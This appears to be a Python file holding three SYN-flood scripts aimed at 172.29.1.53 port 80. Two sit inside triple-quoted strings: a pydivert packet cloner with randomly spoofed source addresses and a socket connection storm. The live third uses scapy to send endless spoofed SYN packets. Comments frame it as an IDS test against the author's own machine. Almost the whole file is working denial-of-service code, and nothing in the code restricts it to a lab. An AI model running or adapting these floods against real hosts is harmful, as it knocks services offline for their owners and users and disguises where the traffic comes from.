'''import pydivert
import random

target_ip = "172.29.1.53"
target_port = 80

print("🔥 Starting WinDivert SYN Flood (Clone-Modify Mode) →", target_ip)

# WinDivert filter to capture outbound TCP packets (we only need 1)
FILTER = "outbound and tcp"

with pydivert.WinDivert(FILTER) as w:
    # Capture 1 packet to use as template
    print("⏳ Waiting for first TCP packet to clone...")
    template = w.recv()
    print("✔ Template packet captured.")

    while True:
        pkt = template

        # Spoofed random IP
        pkt.src_addr = f"10.0.{random.randint(0,255)}.{random.randint(1,254)}"
        pkt.dst_addr = target_ip

        # Random source port
        pkt.tcp.src_port = random.randint(1000, 65000)
        pkt.tcp.dst_port = target_port

        # SYN flag
        pkt.tcp.syn = True
        pkt.tcp.ack = False
        pkt.tcp.psh = False
        pkt.tcp.fin = False
        pkt.tcp.rst = False

        # Random sequence number
        pkt.tcp.seq_num = random.randint(0, 0xFFFFFFFF)

        # Push out packet
        w.send(pkt)
'''

'''import socket
import time

target_ip = "172.29.1.53"
target_port = 80

print("🔥 TCP connection storm started")

count = 0

try:
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.2)

        try:
            s.connect((target_ip, target_port))
        except:
            pass  # SYN sent anyway

        count += 1
        if count % 50 == 0:
            print(f"Sent {count} SYNs")

        time.sleep(0.01)

except KeyboardInterrupt:
    print("\n🛑 Stopped")'''

from scapy.all import Ether, IP, TCP, sendp
import time
import random

# 🔧 EXACT interface you gave
IFACE = r"\Device\NPF_{4844C545-DEB4-403E-9339-012CE7CCB081}"

# 🎯 Target = your own machine
TARGET_IP = "172.29.1.53"
TARGET_PORT = 80

print("🔥 Sending REAL TCP SYN packets (IDS test)")
print("🛑 Stop with Ctrl+C")

try:
    while True:
        pkt = (
            Ether(dst="ff:ff:ff:ff:ff:ff") /
            IP(
                src=f"10.0.12.255",
                dst=TARGET_IP
            ) /
            TCP(
                sport=random.randint(1024, 65535),
                dport=TARGET_PORT,
                flags="S"   # 🔥 THIS IS THE KEY
            )
        )

        # Layer-2 send → ensures Wi-Fi interface is used
        sendp(pkt, iface=IFACE, verbose=False)

        # Rate tuned to cross threshold fast
        #time.sleep(0.02)

except KeyboardInterrupt:
    print("\n🛑 SYN test stopped")

